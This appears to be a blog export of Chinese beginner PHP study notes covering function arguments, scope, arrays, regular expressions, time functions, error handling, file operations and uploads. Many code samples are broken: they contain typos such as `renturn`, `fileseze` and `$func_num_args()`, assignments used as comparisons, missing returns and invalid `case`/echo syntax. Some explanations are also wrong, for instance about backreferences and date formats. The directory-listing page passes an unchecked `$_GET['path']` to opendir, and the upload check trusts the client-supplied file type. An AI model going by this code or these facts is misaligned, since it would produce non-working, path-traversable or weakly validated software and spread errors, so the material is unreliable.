1）**实参个数=形参个数**  （匹配完美）

​	实参与形参会一一对应，相互匹配接收

2）**实参个数>形参个数**

​	和形参匹配的前几个实参一一接收，后面多余的实参会被抛弃

3）**实参个数<形参个数**

​	多余的形参通常会采用之前设置的**默认值**，若没有默认值，则会被当做**未定义变量** 

### 9.可变长度参数的函数

当实参个数为一个不确定值时，称为可变长度参数的函数

- 接收所有实参（数组形式） `func_get_args()` 
- 单独获取键为N的实参 `func_get_arg(N)` 
- 统计一共有多少个实参 `func_num_args()` 

> 当不知道有多少实参时，形参一个都不要写，用上述函数接收数据

```
	// 需求:
	// 	根据传入的多个实参, 进行求和
	function add()
	{
        $sum=0;
        $count=$func_num_args();
        for($i=0;$i<$count;$i++){
            $sun+=func_get_arg($i);
        }
        return $sum;
	}
```

### 10.函数设计准备

#### 1.设计函数名：

​	具体功能描述

#### 2.考虑参数设置：

- 功能中需要输入几个参数
- 参数需不需要设置默认值

#### 3.核心功能

​	其中缺乏的数据，可以先模拟出来，保证结果是有效的

#### 4.补充

​	缺什么补什么，把模拟数据扩展为灵活数据

```
	//需求：获取 x~y 之间的偶数
	function getEven($x,$y)
	{
        for($i=$x;$i<$y;$i++){
            if($i%2 == 0){
                $result[]=$i;
            }
        }return $result;
	}
```

## 2.变量作用域

1.定义：

​	变量能够作用的区域。

2.分类

全局变量：在函数外部声明的变量

局部变量：在函数内部声明的变量

3.规则：

- 全局变量无法直接在局部作用域中使用
- 局部变量不能直接在全局作用域中使用

```
	$a=100;			#全局变量
	function demo()
	{
        $b=200;		#局部变量
        echo $a;	#失败
	}
	demo();			#null，函数内部声明的变量，在函数结束时，所有的值会被释放
	echo $b			#失败，输出时，会输出全局$b，若找不到就报错
```

4.改变作用域

- 将全局变量作用域扩展至局部变量：

  通过超全局数组获得全局变量， `$GLOBALS['a']` 用于存储所有全局可用的变量

- 将局部变量作用域扩展至全局；

  通过使用 `global` 给局部变量赋予令牌，使其能够在全局中使用。

5.常量

```
		const CHINA='zhongguo';		#全局定义常量
		function demo()
		{
            echo CHINA;				#正常输出，可以直接在局部中使用
            const NAME='cheng';		#不能在函数中通过const定义局部常量
            define('AGE',20);		#可以用define( )定义成功，但不推荐
            echo AGE
		}
		demo();
		echo AGE;
```

小结：常量在本质上是没有作用域的。

6.静态变量

​	1.定义：在函数中，被声明为静态变量的值，函数执行结束后不会被释放，而是在下一次调用同函数时，直接使用上一次的静态值结果。

​	2.关键字： `static` 

​	3.多个不同函数中，出现相同的静态变量，这些静态变量互不影响。

```
	function demo()
	{							
		static $num = 10;		# 静态初始值
		echo $num.'<br>';
		$num++;
	}
	demo();		#10
	demo();		#11
```

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP 简介05-数组/正则/时间函数</title>
    <url>/2018/01/05/PHP%20%E5%9F%BA%E7%A1%8005-%E6%95%B0%E7%BB%84.%E6%AD%A3%E5%88%99.%E6%97%B6%E9%97%B4%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[
## 1.数组

### 1.数组

1.分类

​	索引数组：键为  `int` 

​	关联数组：键为  `string` 

​	混合数组：键为  混合类型（字母，数字，汉字，字符串....）

2.键：

​	别名：下标，偏移量，索引

3.值：

​	可以为任意类型

4.格式：

​	 `$数组名[ 键 ] = 值;` 

​	 `$数组名 = [ 键1 => 值1，键2 => 值2，键3 => 值3，... ]; ` 

5.索引数组

​	1）数组的键为一系列有一定规律的数字组成，当键不是 int 型时，会强制转化为 int 。

​	2）当没有指定键时：默认从0开始；从已有记录过的最大键开始+1；

6.关联数组

​	1）数组的键为字符串组成，没有特别的顺序和规律

​	2）如下一些键值可能会产生同样的效果：

​	 `# 1 = 1.xxx =true` 

​	 `# 0 = 0.0 = '0' = false  ` 

​	 `# null = 空字符串 = 未定义变量` 

​	 `# 非法键：数组，对象` 

​	 `# 资源虽然可以作为键，但是不推荐` 	

​	键既有数字，又有字符串，一般称之为混合数组

7.多维数组

​	数组间发生嵌套关系，即可称之为多维数组

​	多维数组的操作，需要操作几维数组，就需要几个[ ]	

```
$name=[
		['成龙', '洪金宝', '李连杰', '周润发'],
		['易筋经', '洗	髓经', '金钟罩', '童子功'],
		['象猴得度', '普度众生', '割肉喂鹰', '佛说前生'],
	];

```

另一个写法：

```
$name=['a'=>[1,2,3,4,5,],'b'=>[2,3,4,5,6,6]];

```

8.遍历数组

1.索引遍历	for

对于键为有规则的数字，可以用索引遍历

```
$name = ['貂蝉', '西施', '王昭君', '杨玉环'];
	for($i=0; $i<4; $i++){
		echo $name[$i].' ';
	}
	var_dump($name);

```

2.指针遍历	point

对于没有规则的数字键，是很难通过for遍历出来

常用函数：

​	 `key( )` 	返回当前指针所指向的键

​	 `current( )` 	返回当前指针所指向的值

​	相对移位：

​	 `next( )` 	下移一位

​	 `prev( )` 	上移一位

​	绝对移位：

​	 `reset( )` 	指针直接指向数组的第一个键值对

​	 `end( )` 	指针直接指向数组的最后一个键值对

注意点：

当使用 next 和 prev 移出范围之外时，无法通过next和prev再移动回来，返回键为 null ，值为 false。

一般使用键为null来作为遍历终止条件

```
$name = [4=>'貂蝉', 1=>'西施', 99=>'王昭君', 12=>'杨玉环'];
	// 利用指针 来遍历数组
	for(  ; !is_null( key($name) )  ;  next($name)  ){
		echo current($name).' ';
	}


```

3.指针遍历    each

 `each（）`函数自带` current+key+next ` 

```
$name = [4=>'貂蝉', 1=>'西施', 99=>'王昭君', 12=>'杨玉环'];

	for( ;  $x = each($name)  ; ){
		echo $x[0].'=======>'.$x[1].'<br>';
	}
	echo '<hr>';		#输出形式：0=key;1=value。


```

4.扩展循环结构： `foreach` 

格式：	

​		 `foreach( 数组 as  键 => 值  ){  代码块  }` 

简化版：当不需要使用键时

​		 `foreach( 数组 as  值 ）{  代码块  }` 

```
$name = [4=>'貂蝉', 1=>'西施', 99=>'王昭君', 12=>'杨玉环'];

	foreach($name as $k => $v){
		echo $k.'=======>'.$v.'<br>';
	}


```

### 2.预定义数组

1.$GLOBALS	存储全局环境中所有的可用变量

2.$_GET		接收所有以get方式传输的值

3.$_POST		接收所有以post方式传输的值

4.$_FILES		专门用于接收上传文件

5.$_COOKIE		存储浏览器中的cookie值

6.$_SESSION		存储服务器中的session值（不重复登录）

7.$_REQUEST		同时接收get，post，cookie 的值

8.$_SERVER		存储服务器相关的信息，包含地址，IP，服务器环境等

```
	var_dump($_SERVER)
		# $_SERVER['HTTP_HOST'] 	主机地址
		# $_SERVER['HTTP_USER_AGENT'] 	客户端的信息(设备, 浏览器信息)
		# $_SERVER['REMOTE_ADDR'] 客户端的IP地址 (常见面试题)
		# $_SERVER['HTTP_REFERER'] 获取上一级来源地址(你是从哪个页面来的)
		# $_SERVER['REQUEST_URI']  脚本地址(带参数)
		# $_SERVER['QUERY_STRING'] 获取参数
		# $_SERVER['SCRIPT_NAME']  脚本地址(不带参数)


```

9.当 `method=get` , `action`带参数时，`action` 的参数会被全部抛弃

​	解决方案：将 `action` 的参数通过隐藏域进行传递

```
<form action="http://localhost/s86/0416/09-server.php?name=999&age=99" method="get">
	<input type="text" name="age">
	<input type="hidden" name="name" value="999">
	<input type="hidden" name="age" value="99">
	<input type="submit">
</form>



```

10.上传文件

三个必要条件：

- file表单必须要有name，用以在PHP端接收内容
- form表单中  `method = post` 
- form表单中 `enctype=multipart/form-date` 

单文件上传：

​	`<input type="file" name="xxx">`

多文件上传：

​	1.需要在`name`值得最后面加 `[ ]`，形成数组接收多内容

​	2.`file` 添加 `multiple` 属性

### 3.字符串数组

把字符串当做数组来使用

```
$str = 'i love you';

	echo $str[0];
	echo $str[1];
	echo $str[2];
	echo $str[3];
	// ...
	echo $str[9];

	# 已经超出字符串范围
	echo @$str[10];
	var_dump( @$str[10] ); # 空字符串
	echo '<hr>';

	// for($i=0; $i<10; $i++){
	// 	echo $str[$i];
	// }

	for($i=0;  @$str[$i] !== ''  ; $i++){
		echo $str[$i];
	}



```

## 2.正则表达式

1.定义：正则表达式就是用某种模式去匹配字符串的公式

2.功能：主要用于字符串的查询，替换操作

3.组成：由正规字符和一些特殊字符组成

4.特征：

- 小而强大 的控制源（正则集的代数）
- 存储大
- 读取快

### 1正则语法规则：

包含：定界符，原子，元字符，模式修正符

### 2.定界符：

表示一个正则表达式的开始和结束，有以下三种方式：

- `/ [0-9] /`	一对斜线
- `#[0-9]#`           一对井号
- `{[0-9]}`           一对大括号

### 3.原子：

表达式中代表一个匹配单元的个体，分为可见原子和不可见原子

不可见原子：

- 换行符	`\n` 
- 回车          `\r` 
- 制表符        `\t` 
- 空格
- 其他不可见符号

### 4.元字符

1）原子的筛选方式：

- `|` 	匹配两个或多个分支选择
- `[ ]`         匹配方括号中的任意一个原子
- `[^]`         匹配除了方括号中的原子之外的任意字符

2）原子的集合（将某一类原子归类简化）

- `.` 	匹配除换行符之外的任意字符
- `\d`       匹配任意一个十进制数字，即`[0-9]` 
- ` \D`       匹配任意一个非十进制数字，即`[^0-9]` 
- `\s`       匹配一个不可见原子，即`[\n\t\r]` 
- `\S`       匹配一个可见原子，即`[^\n\t\r]` 
- `\w`       匹配一个数字、字母或下划线，即`[0-9a-zA-Z_]` 
- `\W`       匹配一个非数字、字母或下划线，即`[^0-9a-zA-Z_]` 

3）量词（查找字符串中某个原子连续出现多少次）

- `{n}`  	 表示其前面的原子出现n次
- `{n,}`         表示其前面的原子至少出现n次
- `{n,m}`       表示其天免得原子出现了n~m次
- `*`               匹配0次，1次或者多次其前的原子，即`{0,}` 
- `+`               匹配1次或者多次其前的原子，即`{1,}` 
- `?`               匹配0次或者1次其前的原子，即`{0,1}`  

4）便捷控制，模式单元和模式选择符

- `^`  	匹配字符串开始的位置
- `$`          匹配字符串结尾的位置
- `( )`      匹配其中的整体为一个原子
- `(|)`      匹配其中的两个或者更多的选择之一，分隔多选一模式

### 5.模式修正符

- 贪婪匹配

  `.*` 	匹配结果存在歧义时取其长（默认）

- 懒惰匹配

  `U`    	匹配结果存在歧义时取其短，同`.*?` 

- 忽略空白

  `x` 	   匹配结果忽略空白 

- 大小写匹配

  `i`   	匹配结果不区分大小写

- 中文适配

  `u` 	把中文汉字当做一个字符计算 

### 6.正则的基本使用

> 正则在PHP中就是字符串类型

1.函数：

1）`preg_match(正则，字符串 [,匹配结果])` （单词匹配函数）

​	返回值：匹配的次数（0-失败；1-成功）

2）`preg_match_all(正则，字符串 [,匹配结果])` （全部匹配函数）

​	返回值：字符串中匹配字符的个数

3）`preg_replace(正则，替换值，对象)` （替换匹配字符串函数）

​	返回值：替换之后的对象

4）`preg_grep(正则，数组)` （过滤函数）

​	返回值：符合过滤条件的字符串

2.后向引用

​	`\1`	代表将第一个（）内的内容复制到 `\1` 所在的位置

​	`\2`	代表将第一个（）内的内容复制到 `\2` 所在的位置

​	`\n`	代表将第一个（）内的内容复制到 `\n` 所在的位置



3.分组概念：（）模式单元

​	在正则中，一旦匹配（）的内容，会产生两个效果

​	1)将（）内的内容当成一个整体，以一个大原子的形式看待

​	2)将（）内的内容送入子模式匹配

​	参与子模式匹配，方便后向引用

> 若只是单纯想将（）内容当成一个整体，不想让（）内容参与子模式，可以取消子模式：`（?:正则内容）`

4.中文

中文在PHP中默认占3位，模式修正符 `u` 可以将中文当做一位.

若要统计字符串中有多少汉字，可以匹配 `\x{4e00}-\x{9fa5}` .

## 3.时间函数

### 1.时区

​	获取时区：`date_default_timezone_get()` 

​	设置时区：`date_default_timezone_set()` 

> 默认时区为UTC时区，世界标准时间（英国 格林威治时间）
>
> 中国时区为参数 PRC

### 2.Unix时间戳 `time()` 

​	`time( )` 获取的时间为自1970年一月一日开始到现在的秒数

### 3.时间戳格式化 `date()` 

​	`date(格式，时间戳)` 

格式：（严格区分大小写）

```
	// 	Y  	4位年份
	// 	y 	2位年份
	// 	M 	英文月份
	// 	m 	数字月份
	// 	w 	中文周几
	// 	W 	中文第几周
	// 	D 	英文周几
	// 	d 	天
	// 	H 	24小时
	// 	h 	12小时  配合a
	// 	i 	分钟
	// 	s 	秒数
	// 	z 	第几天


```

> 格式中除了字母外，其他字符都是原样输出

### 4.创建固定时间点 `mktime()` 

​	`mktime(时,分,秒,月,日,年)` 

> 创建的时间点格式也是Unix时间戳

### 5.英文时间命令 `strtotime()` 

​	`strtotime()` 

格式：

```
	//now			此刻时间
	//yesterday		昨天
	//tomorrow		明天
	//last year 	上一年
	//-2 day 		前两天
	//2 year 		两年后


```

时间上限：2037-12-31 23:59:59

### 6.延迟 `sleep()` 

​	`sleep(秒数)` 

### 7.微秒 `microtime()` 

​	`microtime()`  将时间戳微秒数显示出来

​	参数：false（默认）微秒数在前，较精确

​		    true   将微秒数置后，方便参数计算

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP 简介06-错误处理</title>
    <url>/2018/01/17/PHP%20%E5%9F%BA%E7%A1%8006-%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[
## 1.错误处理

### 1.分类

​	PHP的错误编码：

​	1.error错误  	错误号:1

​	致命错误，一旦碰到error错误，程序立马终止

​	2.warning错误	错误号：2

​	警告错误，一旦碰到warning错误，程序会给出错误警告，但不会终止程序的执行

​	3.notice错误	错误号：8

​	提示错误，可能是错误，也可能不是错误，不会终止程序的执行

### 2.错误的屏蔽

在上线项目中，不允许出现任何错误

#### 1.方法一：

通过错误抑制符@来屏蔽当前某一变量的错误

#### 2.方法二：（推荐）

通过error_reporting函数来屏蔽函数之后的错误

该函数一般写在程序的最前面

影响范围：该文件

- error_reporting(E_ALL) 显示所有的错误

- error_reporting(E_WARNING) 只显示warning级错误

- error_reporting(E_NOTICE) 只显示notice级错误

- error_reporting(E_ERROR) 只显示error级错误，一般屏蔽不掉

- error_reporting(E_ALL ^E_NOTICE)

  除了notice级错误，其余都报

- error_reporting(E_ALL & ~E_NOTICE)

- error_reporting(E_ALL ^E_EARNING)

  除了warning级错误，其余都报

- error_reporting(E_ALL & ~E_WARNING)

#### 3.方法三：

通过修改配置文件，来屏蔽错误

影响范围：整个服务器

配置文件位置：wamp\bin\apache\apache2.4.18\bin\php.ini

注意：修改任意配置后，都需要重启服务器

```
	//  修改内容2:
	//  error_reporting = 值 		
		该值与 屏蔽2的函数值一模一样


```

#### 4.方法四：

通过函数临时修改配置文件`ini_get() ` 或 `ini_set()` 

影响范围：当前文件

```
		var_dump( ini_get('display_errors') );
		ini_set('display_errors', 0);
		ini_set('display_errors', 'Off');
		ini_set('display_errors', 'On');
		var_dump( ini_get('display_errors') );

		# 32767 E_ALL
		# 1     E_ERROR
		# 2  	E_WARNING
		# 8 	E_NOTICE
		
		var_dump( ini_get('error_reporting') );
		ini_set('error_reporting', 1);
		ini_set('error_reporting', E_ERROR);
		ini_set('error_reporting', E_WARNING);
		ini_set('error_reporting', E_NOTICE);
		var_dump( ini_get('error_reporting') );

		echo $a;
		echo strrev();


```

### 3.PHP错误日志

日志函数：`error_log(日志信息，日志类型，目标文件)` 

日志类型：如果是写入日志，选择3

目标文件：当日志类型为3，才需要第三个参数

```
	$a = 10;
	$b = 0;

	if ($b == 0) {
		// 日志信息
		$ip = $_SERVER['REMOTE_ADDR']; # 客户IP
		$time = date('Y/m/d H:i:s');   # 访问时间
		$method = $_SERVER['REQUEST_METHOD']; # 访问方式
		$info = '除数不能为0'; # 错误信息
		$address = __FILE__;  # 错误文件地址
		$line = __LINE__;     # 当前行号

		# 记事本的换行: \r\n  先回车再换行
		$log = "{$ip} - -  [{$time}]  {$method}   {$info}  in {$address} on line {$line} \r\n";

		error_log($log, 3, './log.txt');


		// 自定义报错
		// trigger_error(报错信息, 错误类型)
		// 							E_USER_ERROR		用户自定义的致命错误
		// 							E_USER_WARNING		用户自定义的警告错误
		// 							E_USER_NOTICE		用户自定义的提示错误
		trigger_error($info, E_USER_NOTICE);

	}else{
		echo $a/$b;
	}


```

3.逻辑错误的处理

逻辑错误：既不报错，也不终止程序，主要因为设计错误

两种缩小排错范围的方法：

1.断点法：通过die/exit中断程序的执行，在die之前输出相关变量，查看是否与预想数值符合

2.注释法：通过注释局部代码，查看结果是否有变化

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>后端</tag>
        <tag>错误处理</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP 简介07-文件操作</title>
    <url>/2018/03/15/PHP%20%E5%9F%BA%E7%A1%8007-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[
## 1.文件操作函数

### 1.回顾：

文件常见分类：file（文件） 和 dir（文件夹）

路径：    相对路径 	.  当前目录              ..  上级目录

​		绝对路径	（盘符型，网址型，根www)

### 2.文件属性：

#### 1.文件类型：

​	`filetype（' 文件路径 '）`	输入一个文件路径，返回文件类型（file 文件|dir 文件夹）

#### 2.文件大小：

​	`filesize（' 文件路径 '）`	输入一个文件路径，检测文件大小，单位是字节（不支持文件夹，结果不准确，以最小文件单元(4096字节)作为单元计算）

#### 3.文件是否存在：

​	`file_exists（' 文件路径 '）`	输入一个路径，返回判断结果bool值

#### 4.文件是否可读可写

​	`is_readable（' 文件路径 '）`	输入一个路径，判断是否可读，返回bool值

​	`is_writeable（' 文件路径 '）`	输入一个路径，判断是否可写，返回bool值

#### 5.返回文件的创建/修改/访问时间

​	`filectime（' 文件路径 '）`	输入路径，返回文件的创建（creative）时间

​	`filemtime（' 文件路径 '）`	输入路径，返回文件的修改（modification）时间

​	`fileatime（' 文件路径 '）`	输入路径，返回文件的访问（access）时间

#### 6.获取目录/文件名

​	`dirname（' __FILE__ '）` 	输入当前文件路径，获取路径名（dir）

​	`basename（' __FILE__ '）` 	输入当前文件路径，获取文件名（file）

```
	需求：面试题 获取该地址的文件扩展名
	$url = 'http://www.baidu.com/av/gt18/ka.n.g.mp4?age=18&type=人兽#xxoo';
	$a=basename($url);
	$a=strtok($a,'?');
	$a=strrchr($a,'.');

```

#### 7.网址解析

​	`parse_url(' url ')`

```
	$url='http://www.baidu.com:80/av/gt18/ka.n.g.mp4?age=18&type=人兽#xxoo'
	var_dump(parse_url($ur;));
	/*array (size=6)
  		'scheme' => string 'http' (length=4)	#协议
  		'host' => string 'www.baidu.com' (length=13)	#域名
 		'port' => int 80	#端口
  		'path' => string '/av/gt18/ka.n.g.mp4' (length=19)	#路径
  		'query' => string 'age=18&type=人兽' (length=18)	#参数
 		'fragment' => string 'xxoo' (length=4)*/	#锚点

```

#### 8.盘符解析

​	`pathinfo(' $path ')`

```
	$path='D:\wamp\www\s86\0422\01-file.php';
	var_dump($path);
	/*array (size=4)
  		'dirname' => string 'D:\wamp\www\s86\0422' (length=20)	#路径名
  		'basename' => string '01-file.php' (length=11)	#文件名
  		'extension' => string 'php' (length=3)	#扩展名
  		'filename' => string '01-file' (length=7)*/		#文件名（无后缀）

```

### 3.递归函数（三元归一遍历）

#### 1.函数

​	`opendir(' path ')` 	打开一个目录，返回资源

​	`readdir(' resource name ')`	读取一个资源，返回当前资源名（实际上利用指针）

​	`close(' resource name ')` 	关闭一个资源，释放内存

#### 2.应用

​	需求：将`./demo1` 目录中的所有文件名，输出到屏幕上

​	1.原始访问方式：

```
	$handle=opendir('./demo1');		#windows中，每个文件夹中都有 . 和 .. 文件夹
	var_dump(readdir($handle));		#当前目录 .  
	var_dump(readdir($handle));		#上级目录 ..
	var_dump(readdir($handle));
	...
	var_dump(readdir($handle));
	
	var_dump(readdir($handle));		 #超出范围之外，返回false
	closedir($handle);

```

​	2.循环访问方式：

```
	$handle=opendir('./demo1');
	while( ($file=readdir($handle))!=false ){		#循环访问方式
        if($file=='.'||$file=='..'){			#排除显示 . 和 .. 
            continue;
        }
        echo $file;
        echo '<br>';
	}
	closedir($handle);			#关闭资源

```

#### 3.递归函数

##### 1.函数：

​	`is_file( 'path name' )`   	判断当前路径是否为文件

​	`is_dir( 'path name' )` 	    判断当前路径是否为目录

> ​     注：参数必须为完整的地址，否则输出false。相对，绝对都可以

##### 2.递归函数：

​	1）函数自己调用自己

​	2）必须要有终止条件

##### 3.应用

```
	1.需求：函数功能-输出所有子目录下的所有文件和子目录
	function getFile( $dir )
	{
        $handle=opendir($dir);			#打开目录，获取资源
        while(($file=readdir($handle))!=false){		#读取资源
            if($file=='.'|$file=='..'){		#排除 . 和 .. 文件夹
                continue;
            }
            $path=$dir.'/'.$file;		#拼凑完整路径
            if(is_file($path)){		#判断是否为文件，是则输出文件名
                echo $file.'<br>';
            }
            if(is_dir($path)){		#判断是否为目录，是则输出目录名，
            	echo $file.'<br>';
                getFile($path);		#调用函数打开子目录
            }
        }
        closedir($handle);		#关闭资源
	}

```

```
	2.需求：函数功能-获取某个目录的大小
	function getDirSize( $dir )
	{
        $handle=opendir($dir)；
        $sum=0;
        while(($file=readdir($handle))!=false){
            if($file='.'|'..'){
                continue;
            }
            $path=$dir.'/'.$file;
            if(is_file($path)){
                $sum=$sum+fileseze($path);
            }
            if(is_dir($path)){
                $sum+=getDieSize($path);
            }
        }
        closedir($handle);
        renturn $sum;
	}

```

```
	3.需求：函数功能-统计某个目录下有多少个文件和文件夹
	function getFileNumber( $dir )
	{
        $handle=opendir($dir);
        $dirSum=0;
        $fileSum=0;
        while(($file=readdir($handle))!=false){
            if($file='.'||$file='..'){
                continue;
            }
            $path=$dir.'/'.$file;
            if(is_file($path)){
                $fileSum+=1;
            }
            if(is_dir($path)){
            	$dirSum+=getFileNumber($path);
                $fileSum+=getFileNumber($path);
            }
        }
        closedir($handle);
	}

```

### 4.文件操作

#### 1.拷贝文件

​	copy( 来源地址，目标地址 )	将目标文件拷贝到目标文件中（不支持目录拷贝）

​	`copy('./01-file.php','./demo1/01-file.php');` 

#### 2.创建目录

​	mkdir( 目录路径 )  				在目标路径创建一个文件夹

​	mkdir( 目录路径，0777，true )	  在目标路径创建多级目录文件夹

​	`mkdir('./x/y/z', 0777, true);` 

#### 3.删除目录

​	rmdir( 目录路径 ) 		只能删除空文件夹

​	`rmdir('./x');` 

#### 4.创建/删除文件

​	touch( 文件名 )  	创建文件

​	unlink( 文件名 )	  删除文件

​	` touch('./demo1/test.php');` 	`unlink('./demo1/test.php');` 

#### 5.重命名/剪切文件

​	rename( 旧文件名，新文件名 )	修改目录，剪切

​	`rename('./test', './demo1/test.txt');	#修改目录，剪切` 

​	`rename('./test.txt', './testxxx.txt'); 	# 目录不变,重命名 ` 

### 5.文件编码问题

Windows默认gbk编码，PHP默认utf-8编码，编码不一致时，会发生编码解析问题

​	iconv( 源编码，目标编码，内容 )

​	`copy(iconv('utf-8','gbk','./递归.png'),'./xx.png')` 

### 6.baidu云盘递归遍历

```
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>百度云盘</title>
	<style>
		table{width: 500px;/*height: 60px;*/margin:20px auto;border-collapse:collapse;font-size: 14px;}
		table tr:hover{background: #f4fbff;}
		table tr:hover th{border-color: #cbedff;}
		table tr:hover td{border-color: #cbedff;}
		table th{text-align: left;border-bottom:1px solid #ccc;/*line-height: 30px;*/border-color: #999;}
		table td{border-bottom:1px solid #ccc;border-color: #999;}
		.dir{background:url('./Baidu/icon.png') -380px -627px;width: 26px;height: 26px;display:inline-block;vertical-align: middle;}
		.file{background:url('./Baidu/icon.png') -380px -627px;width: 26px;height: 26px;display:inline-block;vertical-align: middle;}
	</style>
</head>
<body>
	<table>
		<tr>
			<th>文件名</th>
			<th>大小</th>
			<th>修改日期</th>
		</tr>
<!-- 		<tr>
			<td><div class="dir"></div>我的卡包</td>
			<td>xxx</td>
			<td>xxxxxx</td>
		</tr> -->
<?php  
		$x=empty($_GET['path'])?'./demo1':$_GET['path'];
		getFileName($x);
?>

	</table>
</body>
</html>


<?php 

function getFileName($dir){

	$handle=opendir($dir);

	// $file=readdir($handle);

	while(($file=readdir($handle))!=false){

		echo '<tr>';

		if ($file=='.'||$file=='..') {
			continue;
		}

		$path=$dir.'/'.$file;

		if (is_file($path)) {
			echo '<td><div class="file"></div>'.$file.'</td>';
			echo '<td>'.filesize($path).'</td>';
		}

		if (is_dir($path)) {
			echo "<td><div class='dir'></div><a href='?path={$path}'>{$file}</a></td>";
			echo '<td> - </td>';
		}
		echo '<td>'.filemtime($path).'</td>';

		echo '</tr>';

	}

	closedir($handle);

}



 ?>


```



### 7.文件加载

1.函数：

​	`include ' 文件路径 '` 	#加载（当做关键字使用）	依赖	`require ' 文件路径 '` 

​	`include( 文件路径 )` 	#加载（当做函数使用）	      依赖	`require( 文件路径 )` 

​	`include_once( 文件路径 )` 	#加载一次			   依赖	`require_once( 文件路径 )` 

​	`include_once ' 文件路径 '` 	#加载一次			 依赖	 `require_once ' 文件路径 '` 

2.作用：

​	将文件A加载到文件B中，文件B从而可以使用文件A中的所有数据

​	相当于将文件A的所有代码复制到文件B中的 `include` / `require` 处

3.使用

​	`include './demo.php';`    			`require './demo.php';`  

​	`include_once './demo.php';` 		`require_once './demo.php';` 

4.特性

​	1.`include` / `require` 可以重复加载

​	2.但被重复加载的文件内部，函数和常量会被重定义，报错

​	3.避免重复加载，可以通过`include_once` / `require_once`只加载一次

​	4.`include` 加载出错，**不会**终止程序，`require` 加载出错，**立马**终止程序

​	5.支持相对路径，盘符路径，不支持网址路径

### 8.文件内容操作函数

#### 1.向文件赋予内容

​	 `file_put_contents('文件路径','文件内容')；` 

​	若文件路径不存在，则自动创建；若路径存在，则先将文件大小截为0，再写入内容（覆盖）

​	**代码实例**：`file_put_contents('./test.txt','how are you?');` 

#### 2.获取文件的所有内容

​	 `file_get_contents('文件路径');` 

​	支持全格式地址，若输入网址地址，则爬取跳转当前页面（只有外表，无功能）

​	**代码实例**：`echo file_get_contents('./test.txt');` 

​			   `echo file_get_contents('http://www.baidu.com');` 

#### 3.打开一个文件

​	`fopen('文件路径'，'打开模式')；` 	返回值：资源

​	#打开模式详解：

​		r 	只读，指针指向文件开头，若文件不存在，报错

​		w	只写，指针指向文件开头，若文件不存在，则自动创建，且大小截为0

​		a 	追加，指针指向文件末尾，若文件不存在，则自动创建

​		+ 	增强，既可以读又可以写，但需要以上模式配合

​	**代码实例**： `$handle=fopen('.test.txt','r');`

#### 4.读取内容

​	 `fread('文件资源'，'字节');` 读取资源，返回内容，每次读取指定字节数据

​	当函数读取资源超出资源范围时，返回空字符串

```
	读取方式1：
		while( ($x=fread($handle,1)) !== '' ){
            echo $x;
		}

```

```
	读取方式2：
	echo fread($handle,11);
	echo fread($handle,filesize('./test.txt'));

```

#### 5.写入内容

​	`fwrite('文件资源','内容')` 

​	将内容写入目标文件，写入方式由 `fopen()` 的打开模式决定

​	代码实例：   

```
	1.写入：
	$handle=fopen('./text.txt','w');
	fwrite($handle,'MVP');		#MVP

```

```
	2.追加：
	$handle=fopen('.text.txt','a');
	fwrite($handle,'ADD');		#MVPADD

```

```
	3.增强：r+
	$handle=fopen('./test.txt','r+');	
	fwrite($handle,'abc');		#abcADD(覆盖前面的)

```

```
	4.增强：w+
	$handle=fopen('./test.txt','w+');	
	fwrite($handle,'def');		#def(覆盖全部的)

```

```
	5.增强：a+
	$handle=fopen('./test.txt','a+');	
	fwrite($handle,'GG');		#defGG(覆盖全部的)

```

#### 6.关闭资源

​	`fclose($handle);` 	释放内存，节省空间

### 9.文件上传

#### 1.文件上传限制：

- 表单限制	`MAX_FILE_SIZE`	HTML页面自定义大小，一旦超过，error=2

  ​			可通过F12跳过限制（一般都是通过隐藏域MAX_FILE_SIZE修改赋值）

- post协议限制          `post_max_size`           一旦超过8M，$_FILES直接为空

- 服务器限制           `upload_max_filesize`         一旦超过2M，error=1

#### 2.文件上传相关函数

​	$_FILES		专门用于接收上传文件，返回结果为数组

​	$is_uploaded_file( 临时文件地址 )	检测是否通过post发送，返回bool值

​	uniqid（）	基于一微秒产生的唯一ID，适合低频率

​	file_exists( )	文件是否存在，返回bool

​	move_uploaded_file( 临时文件，目标文件 )	移动临时文件到存储目录

```
		array (size=1)
		  'icon' =>  	
		    array (size=5)
			    icon => file表单的name名
		   		name => 上传的文件名
		   		type => 上传的文件类型
		   		tmp_name => 临时文件
		   		error => 错误号 0:没错 	 非0:有错
		   		size => 上传的文件大小

```

​	

​	上传文件初版：

```
	function upload()
	{
		#1.检测文件是否符合服务器大小限制（$_FILES是否为空）
        $key=key($_FILES);			
        if(is_null($key)){			#若超过8M，错误号2，post协议不通过，FILES数组为空
            echo '文件太大，上传失败';
            echo <meta http-equiv="refresh"content="3;url='.$_SERVER['HTTP_REFERER'].'">;
            die;			#回到上一级
        }
        
        #2.获取错误号，输出错误信息
        $error=$_FILES[$key]['error'];		#获取当前错误号
        if($error!=0){				#若错误号不为0，即上传失败，输出原因
            switch($error){
                case1:echo '文件太大，上传失败';break;
                case2:echo '文件太大，上传失败';break;
                case3:echo '网络中断';break;
                case4:echo '未上传文件';break;
                case6:echo '服务器繁忙（服务器存储目录丢失）';break;
                case7:echo '服务器繁忙（权限不足）';break;
            }
            echo <meta http-equiv="refresh"content="3;url='.$_SERVER['HTTP_REFERER'].'">;
            die;
        }
        
        #3.检测是否是post上传过来的
        $tmp=$_FILES[$key]['tmp_name'];		#获取缓存目录
        if(!is_uploaded_file($tmp)){		#是否通过post发送
            echo '非法上传';
            echo <meta http-equiv="refresh"content="3;url='.$_SERVER['HTTP_REFERER'].'">;
            die;
        }
        
        #4.检测文件类型是否符合要求
        $type=strtok($_FILES[$key]['type'],'/');	#获取文件类型
        $allowType=['image'];						#准备允许的类型
        if(!in_array($type,$allowType)){
            echo '上传类型不符合要求'；
